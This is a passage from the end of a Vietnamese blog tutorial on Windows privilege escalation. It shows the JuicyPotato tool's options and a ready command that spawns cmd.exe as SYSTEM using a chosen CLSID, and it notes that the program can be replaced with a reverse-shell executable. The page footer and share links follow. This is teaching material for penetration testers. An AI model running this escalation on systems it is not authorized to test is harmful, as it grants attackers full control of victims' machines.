</span></span><span class=line><span class=cl>-t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both
</span></span><span class=line><span class=cl>-p &lt;program&gt;: program to launch
</span></span><span class=line><span class=cl>-l &lt;port&gt;: COM server listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Optional args:
</span></span><span class=line><span class=cl>-m &lt;ip&gt;: COM server listen address <span class=o>(</span>default 127.0.0.1<span class=o>)</span>
</span></span><span class=line><span class=cl>-a &lt;argument&gt;: <span class=nb>command</span> line argument to pass to program <span class=o>(</span>default NULL<span class=o>)</span>
</span></span><span class=line><span class=cl>-k &lt;ip&gt;: RPC server ip address <span class=o>(</span>default 127.0.0.1<span class=o>)</span>
</span></span><span class=line><span class=cl>-n &lt;port&gt;: RPC server listen port <span class=o>(</span>default 135<span class=o>)</span>
</span></span><span class=line><span class=cl>-c &lt;<span class=o>{</span>clsid<span class=o>}</span>&gt;: CLSID <span class=o>(</span>default BITS:<span class=o>{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class=o>})</span>
</span></span><span class=line><span class=cl>-z only <span class=nb>test</span> CLSID and print token<span class=err>&#39;</span>s user
</span></span></code></pre></td></tr></table></div></div></li><li><p>Ví dụ: Machine của bạn là Win 7 Enterprise ta lấy được mã CLSID là <code>{555F3418-D99E-4E51-800A-6E89CFD8B1D7}</code>, sử dụng JuicyPotato.exe.</p><p><code>./JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}</code></p><p>Có thể thay <code>c:\windows\system32\cmd.exe</code> bằng file reverse shell exe để lấy SYSTEM.</p></li></ul><h1 id=kết>Kết<a hidden class=anchor aria-hidden=true href=#kết>#</a></h1><p>Vậy là mình đã trình bày các cách leo thang đặc quyền trên Windows, còn một vài cách lên SYSTEM trên Windows nữa khai thác Active Directory dự định mình sẽ viết vào bài sau. Cảm ơn bạn đọc đã theo dõi :).</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/privilege-escalation/>Privilege Escalation</a></li><li><a href=https://minhtuanact.github.io/tags/windows/>Windows</a></li><li><a href=https://minhtuanact.github.io/tags/kernel-exploits/>Kernel Exploits</a></li><li><a href=https://minhtuanact.github.io/tags/stored-credentials/>Stored Credentials</a></li><li><a href=https://minhtuanact.github.io/tags/hot-potato/>Hot Potato</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/hackthebox-writeup-remote/><span class=title>« Prev</span><br><span>[Hackthebox - Writeup] Remote</span>
</a><a class=next href=https://minhtuanact.github.io/posts/hackthebox-writeup-cascade/><span class=title>Next »</span><br><span>[Hackthebox - Writeup] Cascade</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on x" href="https://x.com/intent/tweet/?text=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20...&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f&amp;hashtags=PrivilegeEscalation%2cwindows%2cKernelExploits%2cStoredCredentials%2cHotPotato"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f&amp;title=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20...&amp;summary=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20...&amp;source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f&title=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20..."><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on whatsapp" href="https://api.whatsapp.com/send?text=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20...%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on telegram" href="https://telegram.me/share/url?text=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20...&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... on ycombinator" href="https://news.ycombinator.com/submitlink?t=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%232%3a%20Stored%20Credentials%2c%20Kernel%20Exploits%2c%20Scheduled%20Tasks%2c%20...&u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span> ·
Like a locksmith studying the art of keys, I share knowledge to illuminate, not to break. ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script src=/js/hacker-effects.js></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>